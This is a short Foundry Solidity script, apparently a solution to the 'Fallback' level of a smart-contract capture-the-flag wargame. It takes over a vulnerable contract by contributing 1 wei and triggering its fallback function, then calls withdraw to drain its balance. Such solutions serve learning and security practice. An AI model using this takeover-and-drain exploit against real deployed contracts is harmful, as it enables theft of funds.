// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "../src/Level1.sol";
import "forge-std/Script.sol";
import "forge-std/console.sol";

contract FallbackSolution is Script {
    Fallback public fallbackInstance =
        Fallback(payable(0x5d973A49a74D75fC00267210748b27ED211A4fAd));

    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));

        fallbackInstance.contribute{value: 1 wei}();
        address(fallbackInstance).call{value: 1 wei}("");
        console.log("New Owner: ", fallbackInstance.owner());
        console.log("My Address: ", vm.envAddress("MY_ADDRESS"));
        fallbackInstance.withdraw();

        vm.stopBroadcast();
    }
}
